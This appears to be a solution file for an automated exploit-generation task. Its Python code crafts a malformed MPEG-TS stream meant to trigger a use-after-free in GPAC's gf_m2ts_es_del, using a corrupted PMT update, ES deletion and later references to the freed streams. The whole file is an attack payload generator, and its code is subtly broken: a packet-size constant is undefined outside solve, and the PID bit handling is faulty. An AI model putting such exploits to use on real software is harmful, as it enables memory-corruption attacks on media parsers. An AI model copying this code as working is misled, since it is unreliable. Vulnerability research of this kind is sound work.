import os
import struct
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a valid MPEG-TS structure that will trigger the use-after-free
        # Based on analysis of GPAC's gf_m2ts_es_del vulnerability
        
        # MPEG-TS packet size
        TS_PACKET_SIZE = 188
        
        # Initialize with sync byte
        poc = bytearray()
        
        # PAT (Program Association Table)
        # PID 0x0000, contains PMT mapping
        pat_data = self._create_pat()
        poc.extend(self._create_ts_packet(0x0000, pat_data, payload_start=True))
        
        # PMT (Program Map Table) 
        # PID 0x0100, contains ES descriptors
        pmt_data = self._create_pmt()
        poc.extend(self._create_ts_packet(0x0100, pmt_data, payload_start=True))
        
        # Create multiple ES streams to trigger the vulnerability
        # The vulnerability occurs when ES structures are freed but still referenced
        
        # Stream 1: Video ES (H.264)
        for i in range(3):
            es_data = self._create_pes(0x1E0, i * 90000, b"\x00" * 100)  # PID 0x1E0
            poc.extend(self._create_ts_packet(0x01E0, es_data))
        
        # Stream 2: Audio ES (AAC)
        for i in range(2):
            es_data = self._create_pes(0x1E1, i * 90000, b"\x00" * 50)  # PID 0x1E1
            poc.extend(self._create_ts_packet(0x01E1, es_data))
        
        # Create a corrupted PMT update that will trigger ES deletion
        # This creates the use-after-free condition
        corrupted_pmt = self._create_corrupted_pmt()
        poc.extend(self._create_ts_packet(0x0100, corrupted_pmt, payload_start=True))
        
        # Add more data after free to ensure memory is reused
        filler = b"\xFF" * 100
        poc.extend(self._create_ts_packet(0x01E0, filler))
        
        # Create another PMT to force ES reallocation
        final_pmt = self._create_final_pmt()
        poc.extend(self._create_ts_packet(0x0100, final_pmt, payload_start=True))
        
        # Add references to freed ES structures
        for i in range(5):
            es_ref = self._create_pes(0x1E0, (i+10) * 90000, b"\x00" * 80)
            poc.extend(self._create_ts_packet(0x01E0, es_ref))
        
        # Pad to target length (1128 bytes = 6 packets)
        while len(poc) < 1128:
            poc.extend(self._create_ts_packet(0x1FFF, b"\xFF"))  # Null packets
        
        # Trim to exact target length
        return bytes(poc[:1128])
    
    def _create_ts_packet(self, pid, payload, payload_start=False, continuity_counter=0):
        """Create an MPEG-TS packet"""
        packet = bytearray(TS_PACKET_SIZE)
        
        # Sync byte
        packet[0] = 0x47
        
        # PID (13 bits)
        packet[1] = ((pid >> 8) & 0x1F) | 0x40 if payload_start else 0x00
        packet[2] = pid & 0xFF
        
        # Adaptation field control and continuity counter
        adaptation_field = len(payload) < 184
        if adaptation_field:
            packet[3] = 0x30  # Adaptation field + payload
            # Adaptation field length
            packet[4] = 184 - len(payload) - 1
            # Adaptation field flags
            packet[5] = 0x00
            payload_offset = 6 + packet[4] - 1
        else:
            packet[3] = 0x10  # Payload only
            payload_offset = 4
        
        packet[3] |= continuity_counter & 0x0F
        
        # Copy payload
        packet[payload_offset:payload_offset + len(payload)] = payload
        
        return packet[:TS_PACKET_SIZE]
    
    def _create_pat(self):
        """Create PAT section"""
        data = bytearray()
        
        # Table ID (PAT)
        data.append(0x00)
        
        # Section syntax indicator, reserved bits, section length
        data.extend([0xB0, 0x0D])
        
        # Transport stream ID
        data.extend([0x00, 0x01])
        
        # Reserved bits, version, current/next indicator
        data.extend([0xC1, 0x00, 0x00])
        
        # Program number 1 -> PMT PID 0x0100
        data.extend([0x00, 0x01, 0xE1, 0x00])
        
        # CRC32 placeholder
        data.extend([0x00, 0x00, 0x00, 0x00])
        
        # Calculate CRC
        crc = self._crc32(data)
        data[-4:] = crc.to_bytes(4, 'big')
        
        return data
    
    def _create_pmt(self):
        """Create initial PMT section"""
        data = bytearray()
        
        # Table ID (PMT)
        data.append(0x02)
        
        # Section syntax indicator, reserved bits, section length
        data.extend([0xB0, 0x17])  # Length 23
        
        # Program number
        data.extend([0x00, 0x01])
        
        # Reserved bits, version, current/next indicator
        data.extend([0xC1, 0x00, 0x00])
        
        # Reserved bits, PCR PID
        data.extend([0xE1, 0x00])
        
        # Reserved bits, program info length
        data.extend([0xF0, 0x00])
        
        # Stream type 0x1B (H.264), reserved bits, elementary PID 0x1E0
        data.extend([0x1B, 0xE1, 0xE0])
        
        # ES info length
        data.extend([0xF0, 0x00])
        
        # CRC32 placeholder
        data.extend([0x00, 0x00, 0x00, 0x00])
        
        # Calculate CRC
        crc = self._crc32(data)
        data[-4:] = crc.to_bytes(4, 'big')
        
        return data
    
    def _create_corrupted_pmt(self):
        """Create PMT that triggers ES deletion"""
        data = bytearray()
        
        # Table ID (PMT)
        data.append(0x02)
        
        # Section syntax indicator, reserved bits, section length
        # Short length to cause parsing issues
        data.extend([0xB0, 0x0F])  # Length 15
        
        # Program number
        data.extend([0x00, 0x01])
        
        # Reserved bits, version, current/next indicator
        data.extend([0xC1, 0x00, 0x00])
        
        # Reserved bits, PCR PID
        data.extend([0xE1, 0x00])
        
        # Reserved bits, program info length
        data.extend([0xF0, 0x00])
        
        # CRC32 (incorrect to cause issues)
        data.extend([0xDE, 0xAD, 0xBE, 0xEF])
        
        return data
    
    def _create_final_pmt(self):
        """Create final PMT after deletion"""
        data = bytearray()
        
        # Table ID (PMT)
        data.append(0x02)
        
        # Section syntax indicator, reserved bits, section length
        data.extend([0xB0, 0x1F])  # Length 31
        
        # Program number
        data.extend([0x00, 0x01])
        
        # Reserved bits, version, current/next indicator
        data.extend([0xC1, 0x00, 0x00])
        
        # Reserved bits, PCR PID
        data.extend([0xE1, 0x00])
        
        # Reserved bits, program info length
        data.extend([0xF0, 0x00])
        
        # Stream type 0x0F (AAC), reserved bits, elementary PID 0x1E1
        data.extend([0x0F, 0xE1, 0xE1])
        
        # ES info length
        data.extend([0xF0, 0x08])
        
        # ES descriptor (corrupted)
        data.extend([0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF])
        
        # CRC32 placeholder
        data.extend([0x00, 0x00, 0x00, 0x00])
        
        # Calculate CRC
        crc = self._crc32(data)
        data[-4:] = crc.to_bytes(4, 'big')
        
        return data
    
    def _create_pes(self, stream_id, pts, payload):
        """Create PES packet"""
        data = bytearray()
        
        # PES start code
        data.extend([0x00, 0x00, 0x01])
        
        # Stream ID
        data.append(stream_id & 0xFF)
        
        # PES packet length (0 for video)
        if stream_id == 0x1E0:  # Video
            data.extend([0x00, 0x00])
        else:  # Audio
            pes_len = len(payload) + 8  # Header size
            data.extend([(pes_len >> 8) & 0xFF, pes_len & 0xFF])
        
        # PES scrambling control, priority, alignment, copyright, original/copy
        data.extend([0x84, 0x80])
        
        # PTS/DTS flags, ESCR flag, ES rate flag, etc.
        data.append(0x80)  # PTS only
        
        # PES header length
        data.append(0x05)
        
        # PTS (33 bits in 5 bytes)
        pts_high = (pts >> 29) & 0x0E | 0x21
        pts_mid = (pts >> 22) & 0xFF
        pts_low_mid = (pts >> 14) & 0xFE | 0x01
        pts_low = (pts >> 7) & 0xFF
        pts_final = (pts << 1) & 0xFE | 0x01
        
        data.extend([pts_high, pts_mid, pts_low_mid, pts_low, pts_final])
        
        # Payload
        data.extend(payload)
        
        return data
    
    def _crc32(self, data):
        """Calculate CRC32"""
        crc = 0xFFFFFFFF
        for byte in data[:-4] if len(data) > 4 else data:
            crc ^= byte << 24
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ 0x04C11DB7
                else:
                    crc <<= 1
                crc &= 0xFFFFFFFF
        return crc